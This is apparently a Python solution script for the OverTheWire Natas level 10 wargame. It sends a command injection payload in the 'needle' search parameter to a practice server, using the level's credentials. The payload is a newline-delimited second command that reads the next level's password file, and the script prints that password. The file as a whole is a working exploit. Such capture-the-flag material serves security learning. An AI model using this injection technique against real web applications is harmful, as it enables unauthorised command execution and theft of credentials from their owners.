# Vulnerability: Command Injection (Some characters are filtered)

import requests
from bs4 import BeautifulSoup
import colorama
from colorama import Fore, Style


# Initialize colorama for colored console output
colorama.init(autoreset=False)
print(Fore.LIGHTBLUE_EX, Style.BRIGHT)


# Set the username and password for authentication
username = 'natas10'
password = 'D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE'


# Construct the URL using the given username
url = f'http://{username}.natas.labs.overthewire.org/'


# Command Injection Payload
params = {"needle": "\ncat /etc/natas_webpass/natas11\n", "submit": "Avengers"}


# Make a GET request to the URL with basic authentication using the provided credentials & parameters
resp = requests.get(url=url, auth=(username, password), params=params)


# Parse the HTML content of the response using BeautifulSoup
soup = BeautifulSoup(resp.text, 'lxml')


# Extract password for the next level
print(f"Natas 11: {soup.find('pre').text.strip()}")
